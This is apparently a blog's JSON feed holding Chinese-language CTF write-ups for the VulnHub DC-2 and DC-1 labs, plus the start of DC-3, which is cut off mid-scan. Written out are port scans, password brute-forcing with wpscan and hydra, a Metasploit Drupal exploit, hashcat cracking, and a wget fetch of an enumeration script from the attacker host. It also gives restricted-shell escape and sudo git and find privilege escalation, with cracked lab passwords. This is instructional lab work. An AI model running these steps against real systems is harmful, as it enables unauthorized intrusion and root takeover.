      "content_html": "<h2 id=\"_0x01-部署\"> 0x01 部署</h2>\n<p>靶机地址：</p>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-2,311/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.vulnhub.com/entry/dc-2,311/</a></p>\n</blockquote>\n<p>DESCRIPTION</p>\n<p>Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p>\n<p>As with the original DC-1, it's designed with beginners in mind.</p>\n<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>\n<p>Just like with DC-1, there are five flags including the final flag.</p>\n<p>And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.</p>\n<p>In short, the only flag that really counts, is the final flag.</p>\n<p>For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.</p>\n<p>I haven't explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.</p>\n<p>根据靶机说明，需要找到5个flag</p>\n<p>下载镜像, 使用vmware打开, 网络选择NAT模式</p>\n<h2 id=\"_0x02-信息收集\"> 0x02 信息收集</h2>\n<p>nmap扫描网段</p>\n<div><pre><code>nmap -sP <span>192.168</span>.190.0/24\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20210914171026613.png\" alt=\"image-20210914171026613\" />\n发现目标IP:`192.168.190.138</p>\n<p>进一步扫描端口</p>\n<div><pre><code>nmap -T5 -A -v -p-  <span>192.168</span>.190.138\n</code></pre>\n<div><span>1</span><br></div></div><p>扫描结果：</p>\n<div><pre><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 17:11 CST\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 17:11\nCompleted NSE at 17:11, 0.00s elapsed\nInitiating NSE at 17:11\nCompleted NSE at 17:11, 0.00s elapsed\nInitiating NSE at 17:11\nCompleted NSE at 17:11, 0.00s elapsed\nInitiating ARP Ping Scan at 17:11\nScanning 192.168.190.138 [1 port]\nCompleted ARP Ping Scan at 17:11, 0.06s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 17:11\nCompleted Parallel DNS resolution of 1 host. at 17:11, 0.00s elapsed\nInitiating SYN Stealth Scan at 17:11\nScanning 192.168.190.138 [65535 ports]\nDiscovered open port 80/tcp on 192.168.190.138\nDiscovered open port 7744/tcp on 192.168.190.138\nCompleted SYN Stealth Scan at 17:11, 3.65s elapsed (65535 total ports)\nInitiating Service scan at 17:11\nScanning 2 services on 192.168.190.138\nCompleted Service scan at 17:11, 11.88s elapsed (2 services on 1 host)\nInitiating OS detection (try #1) against 192.168.190.138\nNSE: Script scanning 192.168.190.138.\nInitiating NSE at 17:11\nCompleted NSE at 17:11, 2.50s elapsed\nInitiating NSE at 17:11\nCompleted NSE at 17:11, 0.05s elapsed\nInitiating NSE at 17:11\nCompleted NSE at 17:11, 0.00s elapsed\nNmap scan report for 192.168.190.138\nHost is up (0.0052s latency).\nNot shown: 65533 closed ports\nPORT     STATE SERVICE VERSION\n80/tcp   open  http    Apache httpd 2.4.10 ((Debian))\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.10 (Debian)\n|_http-title: Did not follow redirect to http://dc-2/\n7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)\n| ssh-hostkey: \n|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)\n|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)\n|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)\n|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)\nMAC Address: 00:0C:29:5D:44:5F (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nUptime guess: 196.483 days (since Tue Mar  2 05:36:18 2021)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=259 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   5.22 ms 192.168.190.138\n\nNSE: Script Post-scanning.\nInitiating NSE at 17:11\nCompleted NSE at 17:11, 0.00s elapsed\nInitiating NSE at 17:11\nCompleted NSE at 17:11, 0.00s elapsed\nInitiating NSE at 17:11\nCompleted NSE at 17:11, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 20.84 seconds\n           Raw packets sent: 65558 (2.885MB) | Rcvd: 65552 (2.623MB)\n\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br></div></div><p>发现80端口和运行ssh的7744端口</p>\n<h2 id=\"_0x03-漏洞利用\"> 0x03 漏洞利用</h2>\n<p>按照靶机信息提示</p>\n<div><pre><code><span>echo</span> <span>\"192.168.190.138 dc-2\"</span> <span>>></span> /etc/hosts\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"flag1\"> flag1</h3>\n<p>使用浏览器访问目标机80端口，发现运行的wordpress</p>\n<p><img src=\"/assets/img/image-20210914171621897.png\" alt=\"image-20210914171621897\" /></p>\n<p>在flag连接下发现flag1</p>\n<p><img src=\"/assets/img/image-20210914171705987.png\" alt=\"image-20210914171705987\" /></p>\n<div><pre><code>\nFlag 1:\n\nYour usual wordlists probably won’t work, so instead, maybe you just need to be cewl.\n\nMore passwords is always better, but sometimes you just can’t win them all.\n\nLog in as one to see the next flag.\n\nIf you can’t find it, log in as another.\n\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><h3 id=\"flag2\"> flag2</h3>\n<p>根据flag1的提示，需要登录来找下一个flag，使用cewl生成爆破字典</p>\n<div><pre><code>cewl http://dc-2 -w dc2-pass.txt\n</code></pre>\n<div><span>1</span><br></div></div><p>密码有了，下来需要用户，使用wpscan枚举用户</p>\n<div><pre><code>wpscan --url http://dc-2 --enumerate u\n</code></pre>\n<div><span>1</span><br></div></div><p>爆破得到admin，jerry，tom三个用户，爆破之</p>\n<div><pre><code>wpscan -U admin -P dc2-pass.txt --url http://dc-2 --force\nwpscan -U tom -P dc2-pass.txt --url http://dc-2 --force\nwpscan -U jerry -P dc2-pass.txt --url http://dc-2 --force\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><p>admin爆破失败，得到tom和jerry的密码</p>\n<div><pre><code>Username: tom, Password: parturient\nUsername: jerry, Password: adipiscing\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><p>访问wordpress默认登录链接： /<em>wp</em>-admin 或 /<em>wp</em>-login.php</p>\n<p>使用jerry登录后，在pages中找到flag2</p>\n<p><img src=\"/assets/img/image-20210914173732032.png\" alt=\"image-20210914173732032\" /></p>\n<div><pre><code>Flag 2:\n\nIf you can&#39;t exploit WordPress and take a shortcut, there is another way.\n\nHope you found another entry point.\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h3 id=\"flag3\"> flag3</h3>\n<p>根据flag2的提示，如果不能利用wordPress，还有其他的方法。</p>\n<p>还有7744端口开放的ssh服务</p>\n<p>使用hydra对ssh进行爆破</p>\n<div><pre><code>hydra -l tom -P dc2-pass.txt -t <span>1</span> -vV -e ns <span>192.168</span>.190.138 -s <span>7744</span>  <span>ssh</span> \n</code></pre>\n<div><span>1</span><br></div></div><p>爆破得到密码：</p>\n<div><pre><code>[7744][ssh] host: 192.168.190.138   login: tom   password: parturient\n</code></pre>\n<div><span>1</span><br></div></div><p>登录</p>\n<div><pre><code><span>ssh</span> tom@192.168.190.138 -p <span>7744</span>\n</code></pre>\n<div><span>1</span><br></div></div><p>登陆后发现当前目录下存在flag3.txt，使用cat等命令都无法运行，尝试使用vi获得flag3.txt中的内容，得到flag3</p>\n<div><pre><code>flag3\n\nPoor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h3 id=\"flag4\"> flag4</h3>\n<p>根据flag3提示，还有jerry账户，查看/etc/passwd发现果然存在jerry账户</p>\n<p><img src=\"/assets/img/image-20210914181801076.png\" alt=\"image-20210914181801076\" /></p>\n<p>进行rbash逃逸，尝试发现/,sudo,cp命令都无法使用，尝试使用vi进行逃逸</p>\n<div><pre><code><span>vi</span> <span>test</span>\n:set <span>shell</span><span>=</span>/bin/sh <span># 或者用/bin/bash</span>\n:shell\n\n<span># 切换完成之后还要添加环境变量</span>\n<span>export</span> <span><span>PATH</span></span><span>=</span><span>$PATH</span>:/bin/\n<span>export</span> <span><span>PATH</span></span><span>=</span><span>$PATH</span>:/usr/bin/\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><p>逃逸后尝试登录jerry，使用之前爆破的jerry密码</p>\n<p><img src=\"/assets/img/image-20210914182458155.png\" alt=\"image-20210914182458155\" /></p>\n<p>在/home/jerry下发现flag4.txt</p>\n<p><img src=\"/assets/img/image-20210914182536908.png\" alt=\"image-20210914182536908\" /></p>\n<div><pre><code>flag4\nGood to see that you&#39;ve made it this far - but you&#39;re not home yet. \n\nYou still need to get the final flag (the only flag that really counts!!!).  \n\nNo hints here - you&#39;re on your own now.  :-)\n\nGo on - git outta here!!!!\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h3 id=\"flag5\"> flag5</h3>\n<p>根据提示，使用git提权</p>\n<p>运行sudo -l，发现不需要密码可以执行git命令</p>\n<p><img src=\"/assets/img/image-20210914182955798.png\" alt=\"image-20210914182955798\" /></p>\n<p>使用git提权，获得root权限</p>\n<div><pre><code><span>sudo</span> <span>git</span> <span>help</span> status\n<span>!</span>/bin/bash\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><p>在/root下发现最后一个flag</p>\n<div><pre><code> __    __     _ _       _                    _ \n/ / /\\ \\ \\___| | |   __| | ___  _ __   ___  / \\\n\\ \\/  \\/ / _ \\ | |  / _` |/ _ \\| &#39;_ \\ / _ \\/  /\n \\  /\\  /  __/ | | | (_| | (_) | | | |  __/\\_/ \n  \\/  \\/ \\___|_|_|  \\__,_|\\___/|_| |_|\\___\\/   \n\n\nCongratulatons!!!\n\nA special thanks to all those who sent me tweets\nand provided me with feedback - it&#39;s all greatly\nappreciated.\n\nIf you enjoyed this CTF, send me a tweet via @DCAU7.\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div>",
      "image": "http://www.liuhanzhe.com/assets/img/image-20210914171026613.png",
      "date_published": "2021-09-01T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 DC1-writeup",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc1/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc1/",
      "content_html": "<h2 id=\"_0x01-部署\"> 0x01 部署</h2>\n<p>靶机地址：</p>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-1,292/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.vulnhub.com/entry/dc-1,292/</a></p>\n</blockquote>\n<p>根据靶机说明，需要找到5个flag</p>\n<p>下载镜像, 使用vmware打开, 网络选择NAT模式</p>\n<h2 id=\"_0x02-信息收集\"> 0x02 信息收集</h2>\n<p>nmap扫描网段</p>\n<div><pre><code>nmap -sP <span>192.168</span>.190.0/24\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/target/dc1.png\" alt=\"dc1\" /><br>\n发现目标IP:<code>192.168.190.134</code></p>\n<p>进一步扫描端口</p>\n<div><pre><code>nmap -T5 -A -v -p- <span>192.168</span>.190.134\n</code></pre>\n<div><span>1</span><br></div></div><p>扫描结果：</p>\n<div><pre><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 17:38 CST\nHappy 24th Birthday to Nmap, may it live to be 124!\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 17:38\nCompleted NSE at 17:38, 0.00s elapsed\nInitiating NSE at 17:38\nCompleted NSE at 17:38, 0.00s elapsed\nInitiating NSE at 17:38\nCompleted NSE at 17:38, 0.00s elapsed\nInitiating Ping Scan at 17:38\nScanning 192.168.190.134 [2 ports]\nCompleted Ping Scan at 17:38, 0.00s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 17:38\nCompleted Parallel DNS resolution of 1 host. at 17:38, 0.00s elapsed\nInitiating Connect Scan at 17:38\nScanning 192.168.190.134 [65535 ports]\nDiscovered open port 80/tcp on 192.168.190.134\nDiscovered open port 22/tcp on 192.168.190.134\nDiscovered open port 111/tcp on 192.168.190.134\nDiscovered open port 48247/tcp on 192.168.190.134\nCompleted Connect Scan at 17:38, 2.57s elapsed (65535 total ports)\nInitiating Service scan at 17:38\nScanning 4 services on 192.168.190.134\nCompleted Service scan at 17:38, 11.01s elapsed (4 services on 1 host)\nNSE: Script scanning 192.168.190.134.\nInitiating NSE at 17:38\nCompleted NSE at 17:39, 1.62s elapsed\nInitiating NSE at 17:39\nCompleted NSE at 17:39, 0.11s elapsed\nInitiating NSE at 17:39\nCompleted NSE at 17:39, 0.00s elapsed\nNmap scan report for 192.168.190.134\nHost is up (0.00019s latency).\nNot shown: 65531 closed ports\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)\n| ssh-hostkey:\n|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)\n|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)\n|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)\n80/tcp    open  http    Apache httpd 2.2.22 ((Debian))\n|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC\n|_http-generator: Drupal 7 (http://drupal.org)\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n| http-robots.txt: 36 disallowed entries (15 shown)\n| /includes/ /misc/ /modules/ /profiles/ /scripts/\n| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt\n| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt\n|_/LICENSE.txt /MAINTAINERS.txt\n|_http-server-header: Apache/2.2.22 (Debian)\n|_http-title: Welcome to Drupal Site | Drupal Site\n111/tcp   open  rpcbind 2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100024  1          46013/udp   status\n|   100024  1          47802/tcp6  status\n|   100024  1          48247/tcp   status\n|_  100024  1          58175/udp6  status\n48247/tcp open  status  1 (RPC #100024)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nNSE: Script Post-scanning.\nInitiating NSE at 17:39\nCompleted NSE at 17:39, 0.00s elapsed\nInitiating NSE at 17:39\nCompleted NSE at 17:39, 0.00s elapsed\nInitiating NSE at 17:39\nCompleted NSE at 17:39, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 19.83 seconds\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br></div></div><p>发现80端口，且运行的是Drupal</p>\n<h2 id=\"_0x03-漏洞利用\"> 0x03 漏洞利用</h2>\n<p>使用浏览器访问目标机80端口，确定运行Drupal</p>\n<p>Drupal存在已知的可利用漏洞：<a href=\"./../../web/cms/#drupal\">已知Drupal漏洞</a>，使用msf搜索drupal</p>\n<p><img src=\"/assets/img/dc1.0.png\" alt=\"dc1.0\" /></p>\n<p>尝试使用后，使用 <code>exploit/multi/http/drupal_drupageddon</code> 获得metaerpreter shell</p>\n<p><img src=\"/assets/img/image-20210903095826691.png\" alt=\"image-20210903095826691\" /></p>\n<h3 id=\"flag1\"> flag1</h3>\n<p>执行<code>ls</code>发现flag1.txt，查看内容</p>\n<p><img src=\"/assets/img/image-20210903100132779.png\" alt=\"image-20210903100132779\" /></p>\n<h3 id=\"flag2\"> flag2</h3>\n<p>根据flag1的内容，flag可能在drupal的配置文件中，执行<code>shell</code>获取shell后，执行<code>grep -Rn &quot;flag2&quot; *</code>发现flag2在<code>sites/default/settings.php</code>第5行，查看flag</p>\n<p><img src=\"/assets/img/image-20210903102601943.png\" alt=\"image-20210903102601943\" /></p>\n<h3 id=\"flag3\"> flag3</h3>\n<p>flag2提示要通过认证，但是暴力破解不是唯一的方法。配置文件flag2的下面就是数据库配置，考虑通过进入数据库查看账号密码。</p>\n<p>获取交互shell</p>\n<p><code>python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'</code></p>\n<p>通过<code>mysql -u dbuser -p</code>链接数据库</p>\n<p><img src=\"/assets/img/image-20210903105023673.png\" alt=\"image-20210903105023673\" /></p>\n<p>进入drupaldb库，查看所有表</p>\n<p><code>use drupaldb</code></p>\n<p><code>show tables</code></p>\n<div><pre><code>+-----------------------------+\n| Tables_in_drupaldb          |\n+-----------------------------+\n| actions                     |\n| authmap                     |\n| batch                       |\n| block                       |\n| block_custom                |\n| block_node_type             |\n| block_role                  |\n| blocked_ips                 |\n| cache                       |\n| cache_block                 |\n| cache_bootstrap             |\n| cache_field                 |\n| cache_filter                |\n| cache_form                  |\n| cache_image                 |\n| cache_menu                  |\n| cache_page                  |\n| cache_path                  |\n| cache_update                |\n| cache_views                 |\n| cache_views_data            |\n| comment                     |\n| ctools_css_cache            |\n| ctools_object_cache         |\n| date_format_locale          |\n| date_format_type            |\n| date_formats                |\n| field_config                |\n| field_config_instance       |\n| field_data_body             |\n| field_data_comment_body     |\n| field_data_field_image      |\n| field_data_field_tags       |\n| field_revision_body         |\n| field_revision_comment_body |\n| field_revision_field_image  |\n| field_revision_field_tags   |\n| file_managed                |\n| file_usage                  |\n| filter                      |\n| filter_format               |\n| flood                       |\n| history                     |\n| image_effects               |\n| image_styles                |\n| menu_custom                 |\n| menu_links                  |\n| menu_router                 |\n| node                        |\n| node_access                 |\n| node_comment_statistics     |\n| node_revision               |\n| node_type                   |\n| queue                       |\n| rdf_mapping                 |\n| registry                    |\n| registry_file               |\n| role                        |\n| role_permission             |\n| search_dataset              |\n| search_index                |\n| search_node_links           |\n| search_total                |\n| semaphore                   |\n| sequences                   |\n| sessions                    |\n| shortcut_set                |\n| shortcut_set_users          |\n| system                      |\n| taxonomy_index              |\n| taxonomy_term_data          |\n| taxonomy_term_hierarchy     |\n| taxonomy_vocabulary         |\n| url_alias                   |\n| users                       |\n| users_roles                 |\n| variable                    |\n| views_display               |\n| views_view                  |\n| watchdog                    |\n+-----------------------------+\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br></div></div><p>发现user表，查看表中信息</p>\n<p><img src=\"/assets/img/image-20210903105329450.png\" alt=\"image-20210903105329450\" /></p>\n<p>这里通过hashcat破解密码，字典使用kali的rockyou.txt。</p>\n<p>hashcat使用介绍：<a href=\"./../../tools/hashcat.html\">hashcat使用</a></p>\n<p>查询Drupal模式id</p>\n<p><img src=\"/assets/img/image-20210903105827686.png\" alt=\"image-20210903105827686\" /></p>\n<p>执行破解</p>\n<div><pre><code><span>echo</span> <span>\"\\<span>$S</span>\\<span>$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR\"</span> <span>></span> hash.txt\n<span>echo</span> <span>\"\\<span>$S</span>\\<span>$DWGrxef6</span>.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg\"</span> <span>>></span> hash.txt\nhashcat -m <span>7900</span> -a <span>0</span> hash.txt /usr/share/wordlists/rockyou.txt \n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><p>耗时一小时40分钟破解完成，获得admin密码53cr3t，Fred密码MyPassword</p>\n<p><img src=\"/assets/img/dc1.1.png\" alt=\"dc1.1\" /></p>\n<p>使用admin账号登录，在Dashboard中发现flag3</p>\n<img src=\"/assets/img/image-20210903110313231.png\" alt=\"image-20210903110313231\" style=\"zoom: 80%;\" />\n<h3 id=\"flag4\"> flag4</h3>\n<p>根据flag3的提示，<code>cat /etc/passwd</code></p>\n<p><img src=\"/assets/img/image-20210903110638671.png\" alt=\"image-20210903110638671\" /></p>\n<p>发现flag4用户，查看home下存在flag4.txt，查看内容获得flag4</p>\n<p><img src=\"/assets/img/image-20210903110757247.png\" alt=\"image-20210903110757247\" /></p>\n<h3 id=\"flag5\"> flag5</h3>\n<p>根据flag4提示，通过同样方法在root下获取flag，尝试没有权限</p>\n<p><img src=\"/assets/img/image-20210903110856064.png\" alt=\"image-20210903110856064\" /></p>\n<p>使用LineEnum提权</p>\n<p>在kali上下载LineEnum，并启动一个HTTP服务</p>\n<div><pre><code><span>git</span> clone https://github.com/rebootuser/LinEnum.git\n<span>cd</span> LinEnum\npython -m SimpleHTTPServer <span>8080</span>\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><p>在目标机上下载LineEnumh后执行</p>\n<div><pre><code><span>wget</span> http://192.168.190.129:8080/LinEnum.sh\n<span>bash</span> LinEnum.sh\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><p>发现find可以利用</p>\n<p><img src=\"/assets/img/image-20210903112212502.png\" alt=\"image-20210903112212502\" /></p>\n<p>执行</p>\n<div><pre><code><span>find</span> <span>.</span> -exec /bin/sh <span>\\</span><span>;</span> -quit\n</code></pre>\n<div><span>1</span><br></div></div><p>查看权限成功提权</p>\n<p><img src=\"/assets/img/image-20210903112327340.png\" alt=\"image-20210903112327340\" /></p>\n<p>查看/root下flag文件，获得flag5</p>\n<p><img src=\"/assets/img/image-20210903112449541.png\" alt=\"image-20210903112449541\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/target/dc1.png",
      "date_published": "2021-09-01T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 DC3-writeup",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc3/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc3/",
      "content_html": "<h2 id=\"_0x01-部署\"> 0x01 部署</h2>\n<p>靶机地址：</p>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-3,312/\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.vulnhub.com/entry/dc-3,312/</a></p>\n</blockquote>\n<p><strong>DESCRIPTION</strong></p>\n<p>DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>\n<p>As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.</p>\n<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>\n<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.</p>\n<p>For those with experience doing CTF and Boot2Root challenges, this probably won't take you long at all (in fact, it could take you less than 20 minutes easily).</p>\n<p>If that's the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.</p>\n<p>只有一个flag</p>\n<h2 id=\"_0x02-信息收集\"> 0x02 信息收集</h2>\n<p>靶机使用virtual box部署，kali使用vmware部署，都为桥接模式</p>\n<p>nmap扫描网段</p>\n<div><pre><code>nmap -sP 172.21.34.0/24\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20210924101423240.png\" alt=\"image-20210924101423240\" /></p>\n<p>发现靶机IP：172.21.34.31，继续扫描</p>\n<div><pre><code>nmap -T5 -A -v -p- 172.21.34.31\n</code></pre>\n<div><span>1</span><br></div></div><p>结果：</p>\n<div><pre><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 10:04 CST\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nInitiating NSE at 10:04\nCompleted NSE at 10:04, 0.00s elapsed\nInitiating ARP Ping Scan at 10:04\nScanning 172.21.34.31 [1 port]\nCompleted ARP Ping Scan at 10:04, 0.06s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 10:04\nCompleted Parallel DNS resolution of 1 host. at 10:04, 0.00s elapsed\nInitiating SYN Stealth Scan at 10:04\nScanning 172.21.34.31 [65535 ports]\nDiscovered open port 80/tcp on 172.21.34.31\nCompleted SYN Stealth Scan at 10:04, 1.27s elapsed (65535 total ports)\nInitiating Service scan at 10:04\nScanning 1 service on 172.21.34.31\nCompleted Service scan at 10:04, 11.06s elapsed (1 service on 1 host)\nInitiating OS detection (try #1) against 172.21.34.31\nNSE: Script scanning 